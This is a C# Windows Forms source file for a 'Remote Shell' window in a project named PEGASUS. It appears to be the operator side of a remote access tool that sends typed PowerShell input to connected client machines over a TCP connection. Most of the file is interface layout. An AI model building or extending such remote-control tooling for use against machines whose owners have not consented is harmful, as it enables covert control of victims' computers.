using System;
using System.ComponentModel;
using System.Drawing;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;
using Guna.UI2.WinForms;
using PEGASUS.Connection;
using PEGASUS.MessagePack;
using PEGASUS.Properties;

namespace PEGASUS.Forms
{

	public class FormPowerShell : Form
	{
		private IContainer components;

		public System.Windows.Forms.Timer timer1;

		private PictureBox pictureBox8;

		private Panel panel1;

		public RichTextBox richTextBox1;

		private PictureBox pictureBox1;

		private Label label1;

		private Guna2TextBox textBox1;

		private Guna2BorderlessForm guna2BorderlessForm1;

		private Guna2ShadowForm guna2ShadowForm1;

		public PEGASUSMain F { get; set; }

		internal Clients Client { get; set; }

		public FormPowerShell()
		{
			InitializeComponent();
		}

		[DllImport("user32.DLL")]
		private static extern void ReleaseCapture();

		[DllImport("user32.DLL")]
		private static extern void SendMessage(IntPtr hwnd, int wmsg, int wparam, int lparam);

		private void FormPowerShell_FormClosed(object sender, FormClosedEventArgs e)
		{
			ExitShell();
		}

		private void Timer1_Tick(object sender, EventArgs e)
		{
			try
			{
				if (!Client.TcpClient.Connected)
				{
					Close();
				}
			}
			catch
			{
				Close();
			}
		}

		private void ExitShell()
		{
			try
			{
				Client?.Disconnected();
			}
			catch
			{
			}
		}

		private void panel1_MouseDown_1(object sender, MouseEventArgs e)
		{
			ReleaseCapture();
			SendMessage(base.Handle, 274, 61458, 0);
		}

		private void pictureBox8_Click_1(object sender, EventArgs e)
		{
			Close();
		}

		private void textBox1_KeyDown(object sender, KeyEventArgs e)
		{
			if (Client == null || e.KeyData != Keys.Return || string.IsNullOrWhiteSpace(textBox1.Text))
			{
				return;
			}
			if (textBox1.Text == "cls".ToLower())
			{
				richTextBox1.Clear();
				textBox1.Clear();
				return;
			}
			if (textBox1.Text == "exit".ToLower())
			{
				ExitShell();
				Close();
			}
			MsgPack msgPack = new MsgPack();
			msgPack.ForcePathObject("Packet").AsString = "powershellWriteInput";
			msgPack.ForcePathObject("WriteInput").AsString = textBox1.Text;
			ThreadPool.QueueUserWorkItem(Client.Send, msgPack.Encode2Bytes());
			textBox1.Clear();
		}

		protected override void Dispose(bool disposing)
		{
			if (disposing && components != null)
			{
				components.Dispose();
			}
			base.Dispose(disposing);
		}

		private void InitializeComponent()
		{
			components = new System.ComponentModel.Container();
			System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(FormPowerShell));
			timer1 = new System.Windows.Forms.Timer(components);
			pictureBox8 = new System.Windows.Forms.PictureBox();
			panel1 = new System.Windows.Forms.Panel();
			richTextBox1 = new System.Windows.Forms.RichTextBox();
			pictureBox1 = new System.Windows.Forms.PictureBox();
			label1 = new System.Windows.Forms.Label();
			textBox1 = new Guna.UI2.WinForms.Guna2TextBox();
			guna2BorderlessForm1 = new Guna.UI2.WinForms.Guna2BorderlessForm(components);
			guna2ShadowForm1 = new Guna.UI2.WinForms.Guna2ShadowForm(components);
			((System.ComponentModel.ISupportInitialize)pictureBox8).BeginInit();
			panel1.SuspendLayout();
			((System.ComponentModel.ISupportInitialize)pictureBox1).BeginInit();
			SuspendLayout();
			timer1.Interval = 1000;
			timer1.Tick += new System.EventHandler(Timer1_Tick);
			pictureBox8.BackColor = System.Drawing.Color.Transparent;
			pictureBox8.Image = Properties.Resources.x;
			pictureBox8.Location = new System.Drawing.Point(777, 12);
			pictureBox8.Name = "pictureBox8";
			pictureBox8.Size = new System.Drawing.Size(27, 23);
			pictureBox8.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
			pictureBox8.TabIndex = 29;
			pictureBox8.TabStop = false;
			pictureBox8.Click += new System.EventHandler(pictureBox8_Click_1);
			panel1.BackColor = System.Drawing.Color.FromArgb(22, 22, 22);
			panel1.Controls.Add(label1);
			panel1.Controls.Add(pictureBox1);
			panel1.Controls.Add(pictureBox8);
			panel1.Dock = System.Windows.Forms.DockStyle.Top;
			panel1.Location = new System.Drawing.Point(0, 0);
			panel1.Name = "panel1";
			panel1.Size = new System.Drawing.Size(816, 70);
			panel1.TabIndex = 34;
			panel1.MouseDown += new System.Windows.Forms.MouseEventHandler(panel1_MouseDown_1);
			richTextBox1.BackColor = System.Drawing.Color.Black;
			richTextBox1.BorderStyle = System.Windows.Forms.BorderStyle.None;
			richTextBox1.Dock = System.Windows.Forms.DockStyle.Fill;
			richTextBox1.Font = new System.Drawing.Font("Consolas", 8f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
			richTextBox1.ForeColor = System.Drawing.Color.FromArgb(248, 248, 242);
			richTextBox1.Location = new System.Drawing.Point(0, 70);
			richTextBox1.Margin = new System.Windows.Forms.Padding(2);
			richTextBox1.Name = "richTextBox1";
			richTextBox1.ReadOnly = true;
			richTextBox1.Size = new System.Drawing.Size(816, 436);
			richTextBox1.TabIndex = 40;
			richTextBox1.Text = "";
			pictureBox1.Image = (System.Drawing.Image)resources.GetObject("pictureBox1.Image");
			pictureBox1.Location = new System.Drawing.Point(12, 12);
			pictureBox1.Name = "pictureBox1";
			pictureBox1.Size = new System.Drawing.Size(40, 42);
			pictureBox1.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
			pictureBox1.TabIndex = 30;
			pictureBox1.TabStop = false;
			label1.AutoSize = true;
			label1.Font = new System.Drawing.Font("Electrolize", 12f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 0);
			label1.ForeColor = System.Drawing.Color.LightGray;
			label1.Location = new System.Drawing.Point(347, 22);
			label1.Name = "label1";
			label1.Size = new System.Drawing.Size(125, 19);
			label1.TabIndex = 31;
			label1.Text = "POWERSHELL";
			textBox1.BackColor = System.Drawing.Color.FromArgb(36, 36, 36);
			textBox1.BorderColor = System.Drawing.Color.FromArgb(34, 34, 34);
			textBox1.Cursor = System.Windows.Forms.Cursors.IBeam;
			textBox1.DefaultText = "";
			textBox1.DisabledState.BorderColor = System.Drawing.Color.FromArgb(64, 64, 64);
			textBox1.DisabledState.FillColor = System.Drawing.Color.FromArgb(36, 36, 36);
			textBox1.DisabledState.ForeColor = System.Drawing.Color.Gray;
			textBox1.DisabledState.Parent = textBox1;
			textBox1.DisabledState.PlaceholderForeColor = System.Drawing.Color.FromArgb(64, 64, 64);
			textBox1.Dock = System.Windows.Forms.DockStyle.Bottom;
			textBox1.FillColor = System.Drawing.Color.FromArgb(36, 36, 36);
			textBox1.FocusedState.BorderColor = System.Drawing.Color.FromArgb(191, 38, 33);
			textBox1.FocusedState.FillColor = System.Drawing.Color.FromArgb(22, 22, 22);
			textBox1.FocusedState.ForeColor = System.Drawing.Color.White;
			textBox1.FocusedState.Parent = textBox1;
			textBox1.Font = new System.Drawing.Font("Electrolize", 8.999999f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
			textBox1.ForeColor = System.Drawing.Color.White;
			textBox1.HoverState.BorderColor = System.Drawing.Color.FromArgb(191, 38, 33);
			textBox1.HoverState.FillColor = System.Drawing.Color.FromArgb(22, 22, 22);
			textBox1.HoverState.ForeColor = System.Drawing.Color.White;
			textBox1.HoverState.Parent = textBox1;
			textBox1.Location = new System.Drawing.Point(0, 506);
			textBox1.Name = "textBox1";
			textBox1.PasswordChar = '\0';
			textBox1.PlaceholderText = "";
			textBox1.SelectedText = "";
			textBox1.ShadowDecoration.Parent = textBox1;
			textBox1.Size = new System.Drawing.Size(816, 36);
			textBox1.TabIndex = 41;
			textBox1.KeyDown += new System.Windows.Forms.KeyEventHandler(textBox1_KeyDown);
			guna2BorderlessForm1.ContainerControl = this;
			guna2BorderlessForm1.ShadowColor = System.Drawing.Color.FromArgb(191, 37, 33);
			guna2ShadowForm1.ShadowColor = System.Drawing.Color.FromArgb(191, 37, 33);
			guna2ShadowForm1.TargetForm = this;
			base.AutoScaleDimensions = new System.Drawing.SizeF(6f, 13f);
			base.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
			BackColor = System.Drawing.Color.FromArgb(0, 122, 204);
			base.ClientSize = new System.Drawing.Size(816, 542);
			base.Controls.Add(richTextBox1);
			base.Controls.Add(panel1);
			base.Controls.Add(textBox1);
			ForeColor = System.Drawing.SystemColors.ButtonHighlight;
			base.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
			base.Icon = (System.Drawing.Icon)resources.GetObject("$this.Icon");
			base.Margin = new System.Windows.Forms.Padding(2);
			base.Name = "FormPowerShell";
			base.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
			Text = "Remote Shell";
			base.FormClosed += new System.Windows.Forms.FormClosedEventHandler(FormPowerShell_FormClosed);
			((System.ComponentModel.ISupportInitialize)pictureBox8).EndInit();
			panel1.ResumeLayout(false);
			panel1.PerformLayout();
			((System.ComponentModel.ISupportInitialize)pictureBox1).EndInit();
			ResumeLayout(false);
		}
	}
}
